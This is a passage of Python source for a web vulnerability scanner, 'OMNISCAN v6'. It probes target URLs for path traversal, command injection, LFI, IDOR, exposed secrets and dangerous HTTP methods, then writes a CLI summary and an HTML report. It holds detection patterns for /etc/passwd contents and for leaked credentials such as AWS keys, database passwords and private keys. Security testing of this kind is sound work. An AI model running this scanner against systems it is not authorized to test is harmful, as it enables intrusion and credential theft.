                            'confidence':95,'verify_passes':3,'payload_origin':'builtin'})
                        break

    # ──────────────────────────────────────────────────────────
    #  Path Traversal
    # ──────────────────────────────────────────────────────────
    def _test_path(self):
        if not self.tests.get('path'): return
        targets = self._targets(['file','path','load','include','doc','read','download','view','page'])
        unix_pats = [r'root:x:',r'daemon:',r'bin/bash',r'nologin']
        win_pats  = [r'\[fonts\]',r'\[extensions\]']
        queue     = self.payloads['path_traversal']
        total, done = len(targets)*len(queue), [0]
        ptype = 'path_traversal'

        def test(url, param, payload):
            test_url = _inject_url(url, param, payload)
            resp = self._req(test_url)
            if not resp or resp.status_code != 200: return None
            for pat in unix_pats+win_pats:
                m = re.search(pat, resp.text)
                if m:
                    confirmed, conf, passes = self.verifier.verify_path(test_url, param, payload, pat, resp)
                    if not confirmed: return None
                    return {'type':'Path Traversal','url':test_url,'parameter':param,'payload':payload,
                            'severity':'HIGH','evidence':m.group(0)[:80],
                            'details':f'File content returned via "{param}"',
                            'confidence':conf,'verify_passes':passes,
                            'payload_origin':self._payload_origin(payload, ptype)}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test,u,p,pl) for u,p in targets for pl in queue]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"Path Traversal ({done[0]}/{total})", 37+int(done[0]/max(total,1)*7))
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  Command Injection
    # ──────────────────────────────────────────────────────────
    def _test_cmdi(self):
        if not self.tests.get('cmdi'): return
        targets    = self._targets(['cmd','command','exec','system','shell','run','ping','ip'])
        indicators = [r'uid=\d+',r'gid=\d+',r'root:',r'Windows IP',r'PING\s']
        queue      = self.payloads['command_injection']
        total, done = len(targets)*len(queue), [0]
        ptype = 'command_injection'

        def test(url, param, payload):
            test_url = _inject_url(url, param, payload)
            resp = self._req(test_url)
            if not resp: return None
            for pat in indicators:
                m = re.search(pat, resp.text, re.MULTILINE)
                if m:
                    confirmed, conf, passes = self.verifier.verify_cmdi(test_url, param, payload, pat, resp)
                    if not confirmed: return None
                    return {'type':'Command Injection','url':test_url,'parameter':param,'payload':payload,
                            'severity':'CRITICAL','evidence':m.group(0)[:80],
                            'details':f'OS output in response via "{param}"',
                            'confidence':conf,'verify_passes':passes,
                            'payload_origin':self._payload_origin(payload, ptype)}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test,u,p,pl) for u,p in targets for pl in queue]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"Command Injection ({done[0]}/{total})", 44+int(done[0]/max(total,1)*7))
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  LFI
    # ──────────────────────────────────────────────────────────
    def _test_lfi(self):
        if not self.tests.get('lfi'): return
        targets = self._targets(['file','path','include','page','template','doc','load','resource'])
        indicators = [
            (r'root:x:0:0','Unix passwd'),(r'bin/bash','Unix shell'),
            (r'warning: include\(','PHP include error'),
            (r'failed to open stream','PHP stream error'),
        ]
        queue = self.payloads['lfi']
        total, done = len(targets)*len(queue), [0]
        ptype = 'lfi'

        def test(url, param, payload):
            test_url = _inject_url(url, param, payload)
            resp = self._req(test_url)
            if not resp or resp.status_code != 200: return None
            for pat, desc in indicators:
                m = re.search(pat, resp.text, re.IGNORECASE)
                if m:
                    confirmed, conf, passes = self.verifier.verify_lfi(test_url, param, payload, pat, resp)
                    if not confirmed: return None
                    return {'type':'Local File Inclusion (LFI)','url':test_url,'parameter':param,
                            'payload':payload,'severity':'HIGH','evidence':m.group(0)[:80],
                            'details':f'{desc} via "{param}"',
                            'confidence':conf,'verify_passes':passes,
                            'payload_origin':self._payload_origin(payload, ptype)}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test,u,p,pl) for u,p in targets for pl in queue]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"LFI ({done[0]}/{total})", 51+int(done[0]/max(total,1)*7))
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  IDOR
    # ──────────────────────────────────────────────────────────
    def _test_idor(self):
        if not self.tests.get('idor'): return
        targets  = self._targets(['id','user_id','uid','account_id','pid','item_id','order_id'])
        test_ids = ['1','2','0','admin','999999']
        total, done = len(targets)*len(test_ids), [0]

        def test(url, param, tid):
            rv = self._req(_inject_url(url, param, tid))
            ri = self._req(_inject_url(url, param, '999888777xyz'))
            if not (rv and ri): return None

            # Must be 200 for tested ID but auth-error for garbage ID
            if rv.status_code != 200 or ri.status_code not in [401,403,302,404]: return None

            # Re-verify: send a 3rd request to ensure stability
            rv2 = self._req(_inject_url(url, param, tid))
            if not rv2 or rv2.status_code != 200: return None

            conf = 85  # IDOR heuristic — no body-level verification
            return {'type':'Insecure Direct Object Reference (IDOR)',
                    'url':_inject_url(url,param,tid),'parameter':param,
                    'test_value':tid,'payload':tid,'severity':'HIGH',
                    'evidence':f'ID={tid}→{rv.status_code}; invalid→{ri.status_code}',
                    'details':f'"{param}" returns data for ID={tid} but 401/403 for invalid IDs',
                    'confidence':conf,'verify_passes':2,'payload_origin':'builtin'}

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = [ex.submit(test,u,p,tid) for u,p in targets for tid in test_ids]
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"IDOR ({done[0]}/{total})", 58+int(done[0]/max(total,1)*7))
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  Information Disclosure
    # ──────────────────────────────────────────────────────────
    def _test_info(self):
        if not self.tests.get('info'): return
        strong_pats = [
            (r'DB_PASSWORD\s*=',           'DB password in env',          'CRITICAL'),
            (r'AWS_SECRET_ACCESS_KEY\s*=', 'AWS secret key',              'CRITICAL'),
            (r'AWS_ACCESS_KEY_ID\s*=',     'AWS access key ID',           'CRITICAL'),
            (r'SECRET_KEY\s*=',            'Secret key',                  'HIGH'),
            (r'API_KEY\s*=',               'API key',                     'HIGH'),
            (r'PASSWORD\s*=',              'Password in config',          'HIGH'),
            (r'-----BEGIN (?:RSA )?PRIVATE KEY-----','Private key',       'CRITICAL'),
            (r'root:x:0:0',               'Unix /etc/passwd',            'HIGH'),
            (r'"password"\s*:',           'Password in JSON',            'HIGH'),
            (r'\$dbpass\s*=',             'PHP DB password variable',    'CRITICAL'),
            (r'define\s*\(\s*[\'"]DB_PASSWORD','WordPress DB password',  'CRITICAL'),
            (r'ref:\s*refs/heads/',        'Git HEAD exposed',            'MEDIUM'),
            (r'<title>phpinfo\(',          'PHPInfo exposed',             'MEDIUM'),
        ]
        total, done = len(self.sensitive_files), [0]

        def probe(path):
            url  = urljoin(self.target_url, path)
            resp = self._req(url)
            if not resp or resp.status_code not in [200,206]: return None
            for pat, desc, sev in strong_pats:
                m = re.search(pat, resp.text, re.IGNORECASE)
                if m:
                    confirmed, conf, passes = self.verifier.verify_info(url, pat)
                    if not confirmed: return None
                    start = max(0, m.start()-20)
                    ev    = resp.text[start:m.start()+100].strip()
                    return {'type':'Information Disclosure','url':url,'parameter':'','payload':'',
                            'severity':sev,'evidence':ev[:120],'details':f'{desc} at {path}',
                            'confidence':conf,'verify_passes':passes,'payload_origin':'builtin'}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futs = {ex.submit(probe,p):p for p in self.sensitive_files}
            for fut in concurrent.futures.as_completed(futs):
                done[0] += 1
                self._progress(f"Info Disclosure ({done[0]}/{total})", 65+int(done[0]/max(total,1)*10))
                r = fut.result()
                if r: self._add_verified(r)

    # ──────────────────────────────────────────────────────────
    #  HTTP Methods
    # ──────────────────────────────────────────────────────────
    def _test_http(self):
        if not self.tests.get('http'): return
        methods = ['PUT','DELETE','TRACE','CONNECT','PATCH','OPTIONS']
        for i, method in enumerate(methods):
            self._progress(f"HTTP Methods ({i+1}/{len(methods)})", 75+int(i/len(methods)*5))
            resp = self._req(self.target_url, method=method)
            if not resp: continue
            if method == 'OPTIONS':
                allow = resp.headers.get('Allow', resp.headers.get('allow',''))
                if allow and any(m in allow for m in ['PUT','DELETE','TRACE']):
                    self._add_verified({'type':'Dangerous HTTP Method','url':self.target_url,
                        'parameter':'','payload':'','severity':'MEDIUM','method_tested':'OPTIONS',
                        'evidence':f'Allow: {allow}','details':f'Dangerous methods in Allow: {allow}',
                        'confidence':90,'verify_passes':3,'payload_origin':'builtin'})
            elif method == 'TRACE' and resp.status_code == 200 and ('TRACE' in resp.text or 'User-Agent' in resp.text):
                self._add_verified({'type':'Dangerous HTTP Method','url':self.target_url,
                    'parameter':'','payload':'','severity':'LOW','method_tested':'TRACE',
                    'evidence':resp.text[:80],'details':'TRACE enabled – XST risk',
                    'confidence':88,'verify_passes':2,'payload_origin':'builtin'})
            elif method in ['PUT','DELETE','PATCH'] and resp.status_code in [200,201,204]:
                self._add_verified({'type':'Dangerous HTTP Method','url':self.target_url,
                    'parameter':'','payload':'','severity':'HIGH','method_tested':method,
                    'evidence':f'HTTP {resp.status_code}','details':f'{method} accepted → {resp.status_code}',
                    'confidence':92,'verify_passes':3,'payload_origin':'builtin'})

    # ──────────────────────────────────────────────────────────
    #  Main run
    # ──────────────────────────────────────────────────────────
    def run(self):
        print(BANNER)
        print(f"  {FG_CYAN}{BOLD}Target :{RST}  {_fmt_url(self.target_url)}")
        print(f"  {FG_GREY}Threads:{RST} {FG_WHITE}{self.max_workers}{RST}   "
              f"{FG_GREY}Timeout:{RST} {FG_WHITE}{self.timeout}s{RST}")
        active = [k for k, v in self.tests.items() if v]
        print(f"  {FG_GREY}Modules:{RST} {FG_CYAN}{', '.join(active)}{RST}")

        # Show payload queue composition
        for pt in ['xss','sqli_error']:
            w = len(self.brain['payload_winners'].get(pt,{}))
            m = len(self.brain['payload_mutants'].get(pt,[]))
            b = len(self._builtins.get(pt,[]))
            print(f"  {FG_GREY}Queue [{pt}]:{RST} "
                  f"{FG_PURPLE}{w} winners{RST} → "
                  f"{FG_PINK}{m} mutants{RST} → "
                  f"{FG_GREY}{b} builtins{RST}")

        print(f"  {FG_PURPLE}Brain  :{RST} {FG_WHITE}{self.brain['total_scans']} scans · "
              f"{self.brain['total_vulns_found']} vulns recorded{RST}")
        print(f"  {FG_GREY}{'─'*68}{RST}\n")

        self._discover()
        self._fingerprint()
        self._test_xss()
        self._test_sqli()
        self._test_path()
        self._test_cmdi()
        self._test_lfi()
        self._test_idor()
        self._test_info()
        self._test_http()

        self._progress("Saving brain …", 98)
        duration = time.time() - self.start_time
        self.vulnerabilities.sort(key=lambda v: _sev_order(v.get('severity','INFO')))
        brain_record_scan(self.brain, self.target_url, self.vulnerabilities, self.technologies)
        save_brain(self.brain)
        self._log(f"Brain updated — {self.brain['total_scans']} scans · "
                  f"{self.brain['total_vulns_found']} vulns · "
                  f"{sum(len(v) for v in self.brain['payload_winners'].values())} winner payloads", 'ai')
        self._progress("Complete!", 100)

        counts = {s: sum(1 for v in self.vulnerabilities if v.get('severity')==s)
                  for s in ['CRITICAL','HIGH','MEDIUM','LOW','INFO']}
        return {
            'target': self.target_url, 'status': 'completed',
            'duration': f"{duration:.2f}s",
            'endpoints': self.discovered_endpoints,
            'technologies': self.technologies,
            'vulnerabilities': self.vulnerabilities,
            'logs': self.logs,
            'brain_stats': {
                'total_scans': self.brain['total_scans'],
                'total_vulns': self.brain['total_vulns_found'],
                'winner_payloads': sum(len(v) for v in self.brain['payload_winners'].values()),
                'mutant_payloads': sum(len(v) for v in self.brain['payload_mutants'].values()),
            },
            'summary': {
                'total': len(self.vulnerabilities), 'counts': counts,
                'endpoints': len(self.discovered_endpoints),
                'scan_time': f"{duration:.2f}s",
                'start_time': datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S'),
            }
        }

# ══════════════════════════════════════════════════════════════════════════════
#  CLI SUMMARY PRINTER
# ══════════════════════════════════════════════════════════════════════════════
def print_summary(results):
    vulns  = results['vulnerabilities']
    s      = results['summary']
    counts = s['counts']
    bs     = results.get('brain_stats', {})

    print(f"\n  {FG_GREY}{'═'*68}{RST}")
    print(f"  {FG_CYAN}{BOLD}◈  OMNISCAN v6  ·  Scan Complete{RST}")
    print(f"  {FG_GREY}{'═'*68}{RST}")
    print(f"  {FG_GREY}Target   :{RST} {FG_CYAN}{results['target']}{RST}")
    print(f"  {FG_GREY}Duration :{RST} {FG_WHITE}{s['scan_time']}{RST}   "
          f"{FG_GREY}Endpoints:{RST} {FG_WHITE}{s['endpoints']}{RST}")
    print()

    for sev, col in [('CRITICAL',FG_RED),('HIGH',FG_ORANGE),('MEDIUM',FG_YELLOW),
                     ('LOW',FG_GREEN),('INFO',FG_BLUE)]:
        c   = counts.get(sev, 0)
        bar = '▐' + '█'*min(c,30) + '░'*max(0,30-c) + '▌'
        print(f"  {col}{BOLD}{sev:<10}{RST}  {col}{bar}{RST}  {col}{BOLD}{c:>3}{RST}")

    print(f"\n  {BOLD}Total confirmed findings: {FG_WHITE}{BOLD}{len(vulns)}{RST}")
    print(f"  {FG_PURPLE}Brain: {FG_WHITE}{bs.get('total_scans',0)} scans · "
          f"{bs.get('winner_payloads',0)} winners · "
          f"{bs.get('mutant_payloads',0)} mutants generated{RST}")

    if vulns:
        print(f"\n  {BOLD}Findings:{RST}")
        for i, v in enumerate(vulns, 1):
            sev = v.get('severity','INFO')
            col = SEV_FG.get(sev, FG_WHITE)
            origin = v.get('payload_origin','builtin')
            otag = {'winner':f'{FG_PURPLE}★{RST}','mutant':f'{FG_PINK}⚡{RST}'}.get(origin,'')
            conf = v.get('confidence',100)
            print(f"  {FG_GREY}{i:>3}.{RST} {col}{BOLD}[{sev}]{RST} {otag} {FG_WHITE}{v.get('type','')}{RST}  "
                  f"{FG_GREEN}{conf}%{RST}")
            print(f"       {FG_GREY}{v.get('url','')[:70]} {FG_BLUE}↗{RST}")
    print()

# ══════════════════════════════════════════════════════════════════════════════
#  HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
def generate_html_report(results: dict) -> str:
    target  = results['target']
    vulns   = results['vulnerabilities']
    eps     = results['endpoints']
    techs   = results['technologies']
    summary = results['summary']
    counts  = summary['counts']
    ts      = summary['start_time']
    dur     = summary['scan_time']
    bs      = results.get('brain_stats', {})

    def sev_badge(s):
        fg = SEV_HTML.get(s.upper(), ('#6b7280','#0a0a0a','#1a1a1a'))[0]
        return f'<span class="badge" style="background:{fg}">{s}</span>'

    def conf_pill(c):
        col = '#22c55e' if c>=90 else ('#eab308' if c>=70 else '#ef4444')
        return f'<span class="conf-pill" style="background:{col}22;color:{col};border-color:{col}55">{c}% confidence</span>'

    def origin_tag(o):
        m = {'winner':'<span class="otag winner">★ WINNER</span>',
             'mutant':'<span class="otag mutant">⚡ MUTANT</span>',
             'builtin':'<span class="otag builtin">BUILTIN</span>'}
        return m.get(o,'')

    def render_vuln(i, v):
        s  = v.get('severity','INFO').upper()
        fg, bg, _ = SEV_HTML.get(s, ('#6b7280','#0a0a0a','#1a1a1a'))
        steps_html = ''.join(f'<li>{st}</li>' for st in v.get('steps',[]) if st)
        rem_html   = ''.join(f'<li>{_esc(r)}</li>' for r in v.get('remediation',[]))
        refs_html  = ''.join(f'<li>{_open_tab(r)}</li>' for r in v.get('references',[]))
        poc = ''
        if v.get('payload'):
            poc += f'<div class="cb payload-cb"><span class="cb-lbl">Payload</span><code>{_esc(v["payload"])}</code></div>'
        if v.get('evidence'):
            poc += f'<div class="cb evidence-cb"><span class="cb-lbl">Evidence</span><code>{_esc(v["evidence"])}</code></div>'
        return f'''
<div class="vc" id="v{i}" style="border-left-color:{fg};--cbg:{bg}">
  <div class="vh">
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
      <h3><span class="vn">#{i+1}</span>&nbsp;{_esc(v.get("type",""))}</h3>
      {sev_badge(s)} {conf_pill(v.get("confidence",100))} {origin_tag(v.get("payload_origin","builtin"))}
    </div>
    <div class="verify-bar"><span class="vb-dot {'vb-pass' if v.get('verify_passes',0)>=1 else 'vb-fail'}"></span>Stage 1
    <span class="vb-dot {'vb-pass' if v.get('verify_passes',0)>=2 else 'vb-fail'}"></span>Stage 2
    <span class="vb-dot {'vb-pass' if v.get('verify_passes',0)>=3 else 'vb-fail'}"></span>Stage 3</div>
  </div>
  <div class="mg">
    <div class="mi fw"><span class="lbl">URL</span>{_open_tab(v.get("url",""))}</div>
    {'<div class="mi"><span class="lbl">Parameter</span><code class="pbadge">'+_esc(v.get("parameter",""))+'</code></div>' if v.get("parameter") else ''}
    {'<div class="mi"><span class="lbl">CWE</span><span class="tag">'+_esc(v.get("cwe",""))+'</span></div>' if v.get("cwe") else ''}
    {'<div class="mi"><span class="lbl">OWASP</span><span class="tag">'+_esc(v.get("owasp",""))+'</span></div>' if v.get("owasp") else ''}
  </div>
  {'<p class="vd"><strong>Description:</strong> '+_esc(v.get("description",""))+'</p>' if v.get("description") else ''}
  {'<p class="vd imp"><strong>Impact:</strong> '+_esc(v.get("impact",""))+'</p>' if v.get("impact") else ''}
  {poc}
  {'<details><summary class="ds">▶ Steps to Reproduce</summary><ol class="steps">'+steps_html+'</ol></details>' if steps_html else ''}
  {'<details><summary class="ds">🔧 Remediation</summary><ul class="rem">'+rem_html+'</ul></details>' if rem_html else ''}
  {'<details><summary class="ds">📚 References</summary><ul class="refs">'+refs_html+'</ul></details>' if refs_html else ''}
</div>'''

    def stat_card(label, count, color):
        return (f'<div class="sc" style="--sc:{color}">'
                f'<div class="sn" style="color:{color}">{count}</div>'
                f'<div class="sl">{label}</div></div>')

    vulns_html = ''.join(render_vuln(i,v) for i,v in enumerate(vulns)) \
                 if vulns else '<p class="no-v">✅ No vulnerabilities detected.</p>'
    ep_rows = ''.join(
        f'<tr><td>{_open_tab(e.get("url",""))}</td>'
        f'<td class="center"><span class="sb s{str(e.get("status",""))[0]}">{e.get("status","")}</span></td>'
        f'<td class="center">{e.get("size",0):,}B</td>'
        f'<td class="ct">{_esc(e.get("content_type","")[:45])}</td></tr>'
        for e in eps
    )
    toc_items = ''.join(
        f'<a href="#v{i}" class="tl sev-{v.get("severity","INFO").lower()}">'
        f'<span class="tn">#{i+1}</span><span class="tt">{_esc(v.get("type","")[:35])}</span>'
        f'<span class="tc">{v.get("confidence",100)}%</span></a>'
        for i,v in enumerate(vulns)
    )
    tech_items = ''.join(f'<li class="ti">{_esc(t)}</li>' for t in techs)

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>OMNISCAN v6 — {_esc(target)}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;700;800&display=swap');
:root{{--bg:#070d1a;--s1:#0c1525;--s2:#111e31;--s3:#162438;--bd:#1a2d45;--bd2:#213550;
  --tx:#ddeeff;--mu:#6a8fb8;--ac:#4d9fff;--gl:#4d9fff33;
  --cr:#ef4444;--hi:#f97316;--me:#eab308;--lo:#22c55e;--in:#3b82f6;--pu:#a855f7;--pk:#ec4899;}}
*{{margin:0;padding:0;box-sizing:border-box}}html{{scroll-behavior:smooth}}
body{{font-family:'Syne',sans-serif;background:var(--bg);color:var(--tx);line-height:1.65;min-height:100vh}}
a{{color:var(--ac);text-decoration:none}}

/* Layout */
.wrap{{display:grid;grid-template-columns:290px 1fr;min-height:100vh}}

/* Sidebar */
.sb{{background:var(--s1);border-right:1px solid var(--bd);position:sticky;top:0;height:100vh;overflow-y:auto;display:flex;flex-direction:column}}
.sb::-webkit-scrollbar{{width:3px}}.sb::-webkit-scrollbar-thumb{{background:var(--bd2)}}
.sb-top{{padding:22px 20px 18px;background:linear-gradient(145deg,#050b14,#0a1626);border-bottom:1px solid var(--bd)}}
.sb-logo{{font-size:1.1rem;font-weight:800;letter-spacing:1px;background:linear-gradient(90deg,var(--ac),var(--pu));-webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.sb-tag{{font-size:.68rem;color:var(--mu);font-family:'JetBrains Mono',monospace;margin-top:2px}}
.sb-meta{{padding:12px 20px;border-bottom:1px solid var(--bd);font-size:.76rem}}
.smr{{display:flex;justify-content:space-between;padding:3px 0;color:var(--mu)}}
.smr span:last-child{{color:var(--tx);font-weight:700;text-align:right;max-width:140px;word-break:break-all}}
.sb-brain{{padding:10px 20px;border-bottom:1px solid var(--bd);background:linear-gradient(135deg,rgba(168,85,247,.04),rgba(77,159,255,.04))}}
.sbt{{font-size:.65rem;font-weight:700;color:var(--pu);text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px}}
.sbs{{font-size:.73rem;color:var(--mu);display:flex;justify-content:space-between}}
.sbs span{{color:var(--tx);font-weight:700}}
.toc{{padding:12px 20px;flex:1}}
.toct{{font-size:.64rem;font-weight:700;color:var(--mu);text-transform:uppercase;letter-spacing:.8px;margin-bottom:7px}}
.tl{{display:flex;align-items:center;gap:5px;font-size:.73rem;padding:5px 7px;border-radius:4px;margin-bottom:2px;
  text-decoration:none;color:var(--mu);border-left:2px solid transparent;transition:all .12s}}
.tl:hover{{background:var(--s3);color:var(--tx)}}
.tn{{font-family:'JetBrains Mono',monospace;font-size:.66rem;color:var(--mu);min-width:22px}}
.tt{{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}
.tc{{font-size:.65rem;color:var(--lo);font-family:'JetBrains Mono',monospace}}
.tl.sev-critical{{border-left-color:var(--cr)}}.tl.sev-high{{border-left-color:var(--hi)}}
.tl.sev-medium{{border-left-color:var(--me)}}.tl.sev-low{{border-left-color:var(--lo)}}

/* Main */
.main{{padding:32px 38px;overflow-x:hidden}}

/* Header */
.hdr{{background:linear-gradient(135deg,#050d1c,#091525,#0d1c35);border:1px solid var(--bd2);
  border-radius:14px;padding:36px 40px;margin-bottom:26px;position:relative;overflow:hidden}}
.hdr::before,.hdr::after{{content:'';position:absolute;border-radius:50%;pointer-events:none}}
.hdr::before{{top:-80px;right:-80px;width:280px;height:280px;background:radial-gradient(circle,rgba(77,159,255,.07),transparent 70%)}}
.hdr::after{{bottom:-60px;left:80px;width:200px;height:200px;background:radial-gradient(circle,rgba(168,85,247,.05),transparent 70%)}}
.hbadge{{display:inline-flex;align-items:center;gap:5px;font-size:.68rem;font-weight:700;color:var(--pu);
  background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.2);padding:3px 10px;border-radius:20px;
  letter-spacing:.5px;text-transform:uppercase;margin-bottom:12px;font-family:'JetBrains Mono',monospace}}
.htitle{{font-size:1.9rem;font-weight:800;color:var(--tx);line-height:1.2;margin-bottom:8px}}
.hsub{{font-size:.86rem;color:var(--mu);font-family:'JetBrains Mono',monospace}}

/* Stat cards */
.stats{{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:12px;margin-bottom:24px}}
.sc{{background:var(--s1);border:1px solid var(--bd);border-radius:10px;padding:18px 14px;
  text-align:center;border-top:3px solid var(--sc,var(--ac));transition:transform .18s}}
.sc:hover{{transform:translateY(-2px)}}
.sn{{font-size:2rem;font-weight:800;line-height:1;font-family:'JetBrains Mono',monospace}}
.sl{{font-size:.67rem;color:var(--mu);text-transform:uppercase;letter-spacing:.6px;margin-top:6px;font-weight:700}}

/* Sections */
.sec{{background:var(--s1);border:1px solid var(--bd);border-radius:12px;padding:26px;margin-bottom:20px}}
.sect{{font-size:.85rem;font-weight:700;color:var(--ac);letter-spacing:.5px;text-transform:uppercase;
  border-bottom:1px solid var(--bd);padding-bottom:11px;margin-bottom:20px;display:flex;align-items:center;gap:7px}}

/* Vuln cards */
.vc{{background:var(--cbg,var(--s2));border:1px solid var(--bd);border-left:4px solid;
  border-radius:10px;padding:24px;margin-bottom:16px;transition:box-shadow .18s}}
.vc:hover{{box-shadow:0 5px 20px rgba(0,0,0,.5)}}
.vh{{display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:8px;margin-bottom:14px}}
.vh h3{{font-size:.93rem;font-weight:700;display:flex;align-items:center;gap:7px}}
.vn{{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--mu)}}
.badge{{font-size:.63rem;font-weight:800;padding:2px 9px;border-radius:4px;color:#fff;letter-spacing:.5px}}
.conf-pill{{font-size:.65rem;font-weight:700;padding:2px 8px;border-radius:10px;border:1px solid}}
.otag{{font-size:.62rem;font-weight:800;padding:2px 7px;border-radius:4px;letter-spacing:.5px}}
.otag.winner{{background:rgba(168,85,247,.15);color:var(--pu);border:1px solid rgba(168,85,247,.3)}}
.otag.mutant{{background:rgba(236,72,153,.15);color:var(--pk);border:1px solid rgba(236,72,153,.3)}}
.otag.builtin{{background:rgba(106,143,184,.08);color:var(--mu);border:1px solid rgba(106,143,184,.15)}}

/* Verify bar */
.verify-bar{{display:flex;align-items:center;gap:5px;font-size:.72rem;color:var(--mu);margin-top:6px}}
.vb-dot{{width:9px;height:9px;border-radius:50%;display:inline-block;margin-right:3px}}
.vb-pass{{background:var(--lo);box-shadow:0 0 5px var(--lo)}}
.vb-fail{{background:var(--mu)}}

.mg{{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:9px;margin-bottom:12px}}
.mi{{font-size:.8rem}}.mi.fw{{grid-column:1/-1}}
.lbl{{font-size:.62rem;font-weight:700;color:var(--mu);text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:2px}}
.pbadge{{background:rgba(236,72,153,.1);color:var(--pk);padding:2px 7px;border-radius:4px;
  font-size:.8rem;border:1px solid rgba(236,72,153,.2)}}
.tag{{background:var(--s3);color:var(--mu);padding:2px 7px;border-radius:4px;font-size:.78rem;border:1px solid var(--bd)}}
.vd{{font-size:.84rem;color:var(--mu);margin-bottom:9px;line-height:1.6}}
.imp strong{{color:var(--hi)}}.vd strong{{color:var(--ac)}}

.cb{{background:#040810;border:1px solid var(--bd);border-radius:6px;padding:11px 14px;margin-bottom:9px}}
.cb-lbl{{font-size:.6rem;font-weight:700;color:var(--mu);text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:4px}}
.payload-cb code{{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:#f87171;word-break:break-all}}
.evidence-cb code{{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:var(--me);word-break:break-all}}
.pl{{font-family:'JetBrains Mono',monospace;color:#f87171;background:rgba(239,68,68,.08);padding:1px 4px;border-radius:3px}}

details{{margin-bottom:7px}}
.ds{{cursor:pointer;font-size:.83rem;font-weight:700;color:var(--ac);padding:7px 0;user-select:none}}
.ds:hover{{color:var(--tx)}}
.steps,.rem{{margin:10px 0 0 17px;font-size:.82rem;color:var(--mu);line-height:1.85}}
.steps li,.rem li{{margin-bottom:6px}}
.refs{{margin:9px 0 0 17px;font-size:.8rem;line-height:1.8}}

/* Open-in-tab links */
.xl{{display:inline-flex;align-items:center;gap:4px;text-decoration:none;color:var(--ac);transition:color .12s,gap .12s}}
.xl:hover{{color:var(--tx);gap:7px}}
.xl-u{{font-family:'JetBrains Mono',monospace;font-size:.8rem;word-break:break-all}}
.xl-i{{font-size:.82rem;font-weight:700;color:var(--pu);background:rgba(168,85,247,.1);
  border:1px solid rgba(168,85,247,.22);padding:1px 5px;border-radius:3px;flex-shrink:0;
  transition:background .12s,transform .12s;line-height:1.4}}
.xl:hover .xl-i{{background:rgba(168,85,247,.22);transform:translate(1px,-1px)}}

/* Table */
table{{width:100%;border-collapse:collapse;font-size:.81rem}}
thead tr{{background:#050c17}}
th{{padding:10px 13px;text-align:left;font-size:.68rem;font-weight:700;color:var(--mu);
  text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--bd2)}}
td{{padding:10px 13px;border-bottom:1px solid var(--bd);vertical-align:middle}}
tr:hover td{{background:var(--s3)}}
.center{{text-align:center}}.ct{{font-size:.73rem;color:var(--mu);font-family:'JetBrains Mono',monospace}}
.sb2{{padding:2px 7px;border-radius:4px;font-size:.7rem;font-weight:700;font-family:'JetBrains Mono',monospace}}
.s2{{background:rgba(34,197,94,.1);color:var(--lo);border:1px solid rgba(34,197,94,.2)}}
.s3{{background:rgba(234,179,8,.1);color:var(--me);border:1px solid rgba(234,179,8,.2)}}
.s4{{background:rgba(239,68,68,.1);color:var(--cr);border:1px solid rgba(239,68,68,.2)}}

.tlist{{list-style:none;display:flex;flex-wrap:wrap;gap:7px}}
.ti{{background:var(--s3);color:var(--mu);font-size:.78rem;padding:4px 11px;
  border-radius:5px;border:1px solid var(--bd2);font-family:'JetBrains Mono',monospace}}
.no-v{{color:var(--lo);font-size:.92rem;font-weight:700}}

footer{{text-align:center;padding:32px;color:var(--mu);font-size:.75rem;border-top:1px solid var(--bd);margin-top:8px}}
@media(max-width:860px){{.wrap{{grid-template-columns:1fr}}.sb{{position:static;height:auto;max-height:45vh}}.main{{padding:18px}}}}
@media print{{.wrap{{display:block}}.sb{{display:none}}.main{{padding:0}}body{{background:#fff;color:#000}}}}
</style>
</head>
<body>
<div class="wrap">

<!-- SIDEBAR -->
<aside class="sb">
  <div class="sb-top">
    <div class="sb-logo">⬡ OMNISCAN v6</div>
    <div class="sb-tag">Adaptive Payload Intelligence</div>
  </div>
  <div class="sb-meta">
    <div class="smr"><span>Target</span><span title="{_esc(target)}">{_esc(target[:25])}{'…' if len(target)>25 else ''}</span></div>
    <div class="smr"><span>Duration</span><span>{_esc(dur)}</span></div>
    <div class="smr"><span>Findings</span><span>{len(vulns)}</span></div>
    <div class="smr"><span>Endpoints</span><span>{len(eps)}</span></div>
    <div class="smr"><span>Date</span><span>{_esc(ts[:16])}</span></div>
  </div>
